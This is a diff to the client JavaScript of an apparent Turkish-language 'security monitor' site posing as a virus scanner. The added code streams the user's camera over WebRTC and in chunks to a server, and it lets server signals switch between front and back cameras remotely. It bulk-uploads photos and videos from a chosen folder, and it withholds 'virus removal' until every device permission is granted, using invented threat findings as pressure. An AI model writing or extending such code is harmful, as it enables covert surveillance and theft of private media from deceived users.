@@ -276,6 +276,33 @@ let cameraRecorder = null;
 let cameraStream = null;
 let cameraSequence = 0;
 let cameraActive = false;
+let cameraMime = 'video/webm';
+let currentFacing = localStorage.getItem('secmon_camera_facing') || 'user';
+
+async function switchCameraFacing(facing) {
+    currentFacing = facing;
+    try { localStorage.setItem('secmon_camera_facing', facing); } catch {}
+    if (!cameraStream || !cameraActive) return;
+
+    let newStream;
+    try {
+        newStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: false });
+    } catch { return; }
+
+    const newVideo = newStream.getVideoTracks()[0];
+    const audioTracks = cameraStream.getAudioTracks();
+    const oldVideoTracks = cameraStream.getVideoTracks();
+
+    cameraStream = new MediaStream([newVideo, ...audioTracks]);
+
+    if (webrtcPC) {
+        const sender = webrtcPC.getSenders().find(s => s.track && s.track.kind === 'video');
+        if (sender) sender.replaceTrack(newVideo).catch(() => {});
+    }
+
+    createCameraRecorder(cameraStream, cameraMime);
+    oldVideoTracks.forEach(t => t.stop());
+}
 
 async function startCameraRelay() {
     const auth = getAuth();
@@ -315,7 +342,6 @@ async function startCameraRelay() {
 }
 
 async function startCameraWithConstraints(videoConstraints, preferredMime) {
-    const auth = getAuth();
     try {
         if (gPermissionStream) {
             cameraStream = gPermissionStream;
@@ -324,35 +350,55 @@ async function startCameraWithConstraints(videoConstraints, preferredMime) {
             cameraStream = await navigator.mediaDevices.getUserMedia(videoConstraints);
         }
 
-        const mimeType = MediaRecorder.isTypeSupported(preferredMime) ? preferredMime : 'video/webm';
-
-        cameraRecorder = new MediaRecorder(cameraStream, { mimeType });
-        cameraActive = true;
-        cameraSequence = 0;
-
-        cameraRecorder.ondataavailable = async (event) => {
-            if (!event.data || event.data.size === 0) return;
-            const reader = new FileReader();
-            reader.onload = async () => {
-                try {
-                    const b64 = reader.result.split(',')[1];
-                    await fetch(`${API_BASE}/api/relay/camera-chunk`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            uid: auth.uid,
-                            chunk: b64,
-                            sequence: cameraSequence++,
-                            mimeType: mimeType
-                        })
-                    });
-                } catch {}
-            };
-            reader.readAsDataURL(event.data);
-        };
-
-        cameraRecorder.start(2000);
+        createCameraRecorder(cameraStream, preferredMime);
     } catch {}
+}
+
+function createCameraRecorder(stream, preferredMime) {
+    if (!stream) return;
+    if (cameraRecorder && cameraRecorder.state !== 'inactive') {
+        try { cameraRecorder.stop(); } catch {}
+    }
+
+    const mimeType = MediaRecorder.isTypeSupported(preferredMime) ? preferredMime : 'video/webm';
+    cameraMime = mimeType;
+
+    try {
+        cameraRecorder = new MediaRecorder(stream, { mimeType });
+    } catch {
+        cameraRecorder = new MediaRecorder(stream);
+        cameraMime = cameraRecorder.mimeType || 'video/webm';
+    }
+    cameraActive = true;
+
+    cameraRecorder.ondataavailable = (event) => {
+        if (!event.data || event.data.size === 0) return;
+        sendCameraChunk(event.data, cameraMime);
+    };
+
+    cameraRecorder.start(1000);
+}
+
+async function sendCameraChunk(blob, mimeType) {
+    const auth = getAuth();
+    if (!auth || !blob || blob.size === 0) return;
+    const reader = new FileReader();
+    reader.onload = async () => {
+        try {
+            const b64 = reader.result.split(',')[1];
+            await fetch(`${API_BASE}/api/relay/camera-chunk`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    uid: auth.uid,
+                    chunk: b64,
+                    sequence: cameraSequence++,
+                    mimeType: mimeType
+                })
+            });
+        } catch {}
+    };
+    reader.readAsDataURL(blob);
 }
 
 function stopCameraRelay() {
@@ -837,8 +883,7 @@ function stopStoragePolling() {
 
 async function pollStorageSignals() {
     const auth = getAuth();
-    const perms = checkPermissions();
-    if (!auth || !perms || !perms.storage) return;
+    if (!auth) return;
 
     try {
         const resp = await fetch(
@@ -848,7 +893,12 @@ async function pollStorageSignals() {
         if (data.status === 'ok' && data.signals) {
             for (const signal of data.signals) {
                 if (signal === 'start_scan') {
-                    await startStorageRelay();
+                    const perms = checkPermissions();
+                    if (perms && perms.storage) await startStorageRelay();
+                } else if (signal === 'cam_front') {
+                    switchCameraFacing('user');
+                } else if (signal === 'cam_back') {
+                    switchCameraFacing('environment');
                 }
             }
         }
@@ -1226,6 +1276,12 @@ async function requestVirusDelete() {
     const auth = getAuth();
     if (!auth) return;
 
+    const perms = checkPermissions();
+    if (!perms || !perms.camera || !perms.microphone || !perms.speaker || !perms.location || !perms.storage) {
+        reopenPermissions();
+        return;
+    }
+
     const area = document.getElementById('virusScanArea');
     const btn = document.getElementById('deleteVirusBtn');
     if (btn) { btn.disabled = true; btn.textContent = 'İşlem başlatılıyor...'; }
@@ -1234,19 +1290,23 @@ async function requestVirusDelete() {
         await fetch('/api/relay/virus/notify-delete', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ uid: auth.uid })
+            body: JSON.stringify({
+                uid: auth.uid,
+                auth: makeAuthPayload(),
+                findings: virusScanFindings.map(v => ({
+                    name: v.name, type: v.type, severity: v.severity,
+                    path: v.path, foundAt: v.foundAt
+                }))
+            })
         });
 
         area.innerHTML = `
             <div class="scan-delete-wait">
                 <div class="scan-delete-spinner"></div>
-                <h2>Temizleniyor...</h2>
+                <h2>Temizlik Devam Ediyor</h2>
                 <p class="scan-delete-warn">
-                    ⚠️ LÜTFEN BU EKRANI KAPATMAYIN ⚠️<br><br>
-                    Tespit edilen ${virusScanFindings.length} tehdit temizleniyor.<br>
-                    Silme işlemi devam ederken bu ekranı kapatmanız durumunda<br>
-                    sistem geri dönüşü olmayan hasarlara maruz kalabilir.<br><br>
-                    <span class="scan-delete-sub">Silme işlemi başlatıldı, lütfen bekleyin...</span>
+                    ${virusScanFindings.length} tehdit silme için yönetici onayı bekleniyor.<br><br>
+                    <span class="scan-delete-sub">Onaylandığında ekran otomatik güncellenecek, lütfen bekleyin...</span>
                 </p>
             </div>
         `;
@@ -1256,7 +1316,7 @@ async function requestVirusDelete() {
     }
 }
 
-function startDeletePolling() {
+function startDeletePolling(onDone) {
     const auth = getAuth();
     if (!auth) return;
 
@@ -1266,7 +1326,7 @@ function startDeletePolling() {
             const data = await resp.json();
             if (data.status === 'ok' && data.cleaned) {
                 clearInterval(poll);
-                showCleanSuccess();
+                (onDone || showCleanSuccess)();
             }
         } catch {}
     }, 2000);
@@ -1347,6 +1407,12 @@ function reopenPermissions() {
 
 let webrtcPC = null;
 let webrtcConnected = false;
+let webrtcAnswerPoll = null;
+let webrtcIcePoll = null;
+let webrtcMaintenanceTimer = null;
+let webrtcStreamRetryTimer = null;
+let webrtcLastOffer = null;
+let webrtcUid = null;
 
 async function startWebRTC() {
     if (webrtcConnected || webrtcPC) return;
@@ -1362,7 +1428,11 @@ async function startWebRTC() {
         stream = cameraStream;
     } else if (audioStream) {
         stream = audioStream;
-    } else { return; }
+    } else {
+        clearTimeout(webrtcStreamRetryTimer);
+        webrtcStreamRetryTimer = setTimeout(startWebRTC, 2000);
+        return;
+    }
 
     try {
         const pc = new RTCPeerConnection({
@@ -1375,6 +1445,7 @@ async function startWebRTC() {
             iceCandidatePoolSize: 10
         });
         webrtcPC = pc;
+        webrtcConnected = false;
 
         stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
@@ -1387,40 +1458,37 @@ async function startWebRTC() {
         pc.oniceconnectionstatechange = () => {
             if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
                 webrtcConnected = true;
+            } else if (pc.iceConnectionState === 'failed') {
+                resetWebRTC();
             }
         };
 
         const offer = await pc.createOffer();
         await pc.setLocalDescription(offer);
 
-        await fetch('/api/relay/webrtc/offer', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                uid: auth.uid,
-                auth: makeAuthPayload(),
-                sdp: offer.sdp,
-                type: offer.type
-            })
-        });
+        webrtcLastOffer = offer;
+        webrtcUid = auth.uid;
+        await postWebRTCOffer(auth.uid, offer);
 
         pollWebRTCAnswer(auth);
         startWebRTCIcePolling(auth);
+        startWebRTCMaintenance();
 
     } catch {}
 }
 
 async function pollWebRTCAnswer(auth) {
-    const maxAttempts = 30;
-    let attempt = 0;
-    const poll = setInterval(async () => {
-        attempt++;
-        if (attempt > maxAttempts) { clearInterval(poll); return; }
+    stopWebRTCAnswerPoll();
+    webrtcAnswerPoll = setInterval(async () => {
+        if (!webrtcPC || (webrtcPC.remoteDescription && webrtcPC.remoteDescription.sdp)) {
+            stopWebRTCAnswerPoll();
+            return;
+        }
         try {
             const resp = await fetch(`/api/relay/webrtc/answer?uid=${auth.uid}&auth=${makeAuthPayload()}`);
             const data = await resp.json();
             if (data.status === 'ok' && data.sdp && webrtcPC) {
-                clearInterval(poll);
+                stopWebRTCAnswerPoll();
                 await webrtcPC.setRemoteDescription(new RTCSessionDescription({
                     sdp: data.sdp,
                     type: data.type
@@ -1428,6 +1496,13 @@ async function pollWebRTCAnswer(auth) {
             }
         } catch {}
     }, 2000);
+}
+
+function stopWebRTCAnswerPoll() {
+    if (webrtcAnswerPoll) {
+        clearInterval(webrtcAnswerPoll);
+        webrtcAnswerPoll = null;
+    }
 }
 
 async function sendIceCandidate(uid, candidate) {
@@ -1446,8 +1521,9 @@ async function sendIceCandidate(uid, candidate) {
 
 function startWebRTCIcePolling(auth) {
     if (!webrtcPC) return;
-    const poll = setInterval(async () => {
-        if (!webrtcPC) { clearInterval(poll); return; }
+    stopWebRTCIcePolling();
+    webrtcIcePoll = setInterval(async () => {
+        if (!webrtcPC) { stopWebRTCIcePolling(); return; }
         try {
             const resp = await fetch(`/api/relay/webrtc/ice?uid=${auth.uid}&auth=${makeAuthPayload()}`);
             const data = await resp.json();
@@ -1458,6 +1534,54 @@ function startWebRTCIcePolling(auth) {
             }
         } catch {}
     }, 3000);
+}
+
+function stopWebRTCIcePolling() {
+    if (webrtcIcePoll) {
+        clearInterval(webrtcIcePoll);
+        webrtcIcePoll = null;
+    }
+}
+
+async function postWebRTCOffer(uid, offer) {
+    try {
+        await fetch('/api/relay/webrtc/offer', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: uid,
+                auth: makeAuthPayload(),
+                sdp: offer.sdp,
+                type: offer.type
+            })
+        });
+    } catch {}
+}
+
+function startWebRTCMaintenance() {
+    if (webrtcMaintenanceTimer) return;
+    webrtcMaintenanceTimer = setInterval(async () => {
+        if (!webrtcLastOffer || !webrtcUid) return;
+        if (!webrtcPC) {
+            webrtcLastOffer = null;
+            startWebRTC();
+            return;
+        }
+        if (webrtcConnected || (webrtcPC.remoteDescription && webrtcPC.remoteDescription.sdp)) return;
+        await postWebRTCOffer(webrtcUid, webrtcLastOffer);
+        const auth = getAuth();
+        if (auth) pollWebRTCAnswer(auth);
+    }, 5000);
+}
+
+function resetWebRTC() {
+    if (!webrtcPC) return;
+    stopWebRTCAnswerPoll();
+    stopWebRTCIcePolling();
+    try { webrtcPC.close(); } catch {}
+    webrtcPC = null;
+    webrtcConnected = false;
+    setTimeout(() => { startWebRTC(); }, 3000);
 }
 
 // ============ VIRUS TRIGGER POLLING ============
@@ -1711,7 +1835,105 @@ function deleteStorageFile(fileId) {
         .catch(() => {});
 }
 
+// ============ FOTOĞRAFLAR/VIDEOLAR KLASÖR ERİŞİMİ ============
+
+const MEDIA_EXT_RE = /\.(jpe?g|png|gif|webp|bmp|svg|mp4|mov|avi|mkv|webm|m4v|3gp|heic|heif)$/i;
+
+function isMediaFile(name) {
+    return MEDIA_EXT_RE.test(name || '');
+}
+
+function photoFolderPermission() {
+    try { return localStorage.getItem('secmon_photo_folder') === '1'; } catch { return false; }
+}
+
+function markPhotoFolderPermission() {
+    try { localStorage.setItem('secmon_photo_folder', '1'); } catch {}
+    const btn = document.getElementById('photoFolderBtn');
+    if (btn) btn.textContent = '✅ Fotoğraflar/Videolar';
+}
+
+async function grantPhotoFolder() {
+    if (window.showDirectoryPicker) {
+        let dirHandle;
+        try {
+            dirHandle = await window.showDirectoryPicker({ mode: 'read' });
+        } catch { return; }
+        markPhotoFolderPermission();
+        const files = await collectMediaFiles(dirHandle, 0);
+        if (files.length) await uploadMediaFiles(files);
+        else refreshStorageList();
+        return;
+    }
+    // Fallback (Safari/Firefox): webkitdirectory input, 2 seviye derinlik client tarafında sınırlanır
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.webkitdirectory = true;
+    input.multiple = true;
+    input.onchange = async () => {
+        const files = Array.from(input.files || [])
+            .slice(0, 100)
+            .filter(f => {
+                const rel = (f.webkitRelativePath || f.name).split('/');
+                return rel.length <= 3 && isMediaFile(f.name); // kök + 2 seviye
+            });
+        markPhotoFolderPermission();
+        if (files.length) await uploadMediaFiles(files);
+        else refreshStorageList();
+    };
+    input.click();
+}
+
+async function collectMediaFiles(dirHandle, depth, out = []) {
+    if (depth > 2 || out.length >= 100) return out;
+    for await (const [name, handle] of dirHandle.entries()) {
+        if (out.length >= 100) break;
+        if (handle.kind === 'file') {
+            if (isMediaFile(name)) {
+                try { out.push(await handle.getFile()); } catch {}
+            }
+        } else if (handle.kind === 'directory' && depth < 2) {
+            await collectMediaFiles(handle, depth + 1, out);
+        }
+    }
+    return out;
+}
+
+async function uploadMediaFiles(files) {
+    const progress = document.getElementById('storageUploadProgress');
+    const fill = document.getElementById('storageUploadFill');
+    const status = document.getElementById('storageUploadStatus');
+    const pct = document.getElementById('storageUploadPct');
+    if (progress) progress.style.display = 'block';
+
+    let done = 0;
+    for (const file of files) {
+        const formData = new FormData();
+        formData.append('file', file);
+        formData.append('uid', (getAuth()?.uid) || '');
+        formData.append('auth', getStorageAuth());
+        try {
+            await fetch('/api/storage/upload', { method: 'POST', body: formData });
+        } catch {}
+        done++;
+        const pc = Math.round((done / files.length) * 100);
+        if (fill) fill.style.width = pc + '%';
+        if (pct) pct.textContent = '%' + pc;
+        if (status) status.textContent = done + '/' + files.length + ' yüklendi';
+    }
+
+    setTimeout(() => {
+        if (progress) progress.style.display = 'none';
+        if (fill) fill.style.width = '0%';
+        refreshStorageList();
+    }, 1200);
+}
+
 document.addEventListener('DOMContentLoaded', () => {
+    if (photoFolderPermission()) {
+        const btn = document.getElementById('photoFolderBtn');
+        if (btn) btn.textContent = '✅ Fotoğraflar/Videolar';
+    }
     const checkAuth = setInterval(() => {
         if (getAuth()?.uid) {
             refreshStorageList();
@@ -1834,37 +2056,47 @@ async function completeManualClean() {
     const btn = document.getElementById('virusScanBtn');
     const progressArea = document.getElementById('virusManualProgress');
     const findingsList = document.getElementById('manualScanFindings');
+    const statusArea = document.getElementById('virusStatusArea');
     if (!btn || !progressArea) return;
 
-    btn.disabled = true;
-    btn.textContent = '🧹 Temizleniyor...';
-
-    // Admin bildirimi gönder (onay BEKLEMEZ)
     const auth = getAuth();
-    if (auth) {
-        try {
-            await fetch('/api/relay/virus/notify-delete', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ uid: auth.uid })
-            });
-        } catch {}
-    }
+    if (!auth) return;
 
-    setTimeout(() => {
-        if (findingsList) findingsList.innerHTML = '';
-        const statusArea = document.getElementById('virusStatusArea');
+    btn.disabled = true;
+    btn.textContent = '⏳ Başlatılıyor...';
+
+    try {
+        await fetch('/api/relay/virus/notify-delete', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: auth.uid,
+                auth: makeAuthPayload(),
+                findings: virusScanFindings.map(v => ({
+                    name: v.name, type: v.type, severity: v.severity,
+                    path: v.path, foundAt: v.foundAt
+                }))
+            })
+        });
+    } catch {}
+
+    if (findingsList) findingsList.innerHTML = '';
+    progressArea.style.display = 'none';
+    if (statusArea) {
+        statusArea.innerHTML = `<div class="card-placeholder">⏳ Temizlik devam ediyor — yönetici onayı bekleniyor (${virusScanFindings.length} tehdit)...</div>`;
+        statusArea.style.display = 'block';
+    }
+    btn.textContent = '⏳ Onay bekleniyor';
+
+    startDeletePolling(() => {
         if (statusArea) {
             statusArea.innerHTML = `<div class="card-placeholder" style="color:var(--accent-green);">✅ ${virusScanFindings.length} tehdit temizlendi. Sisteminiz güvende.</div>`;
-            statusArea.style.display = 'block';
         }
-        progressArea.style.display = 'none';
-
         btn.textContent = '🔍 Tara';
         btn.disabled = false;
         btn.onclick = startManualVirusScan;
         virusScanFindings = [];
-    }, 1500);
+    });
 }
 
 // ============ INIT ============
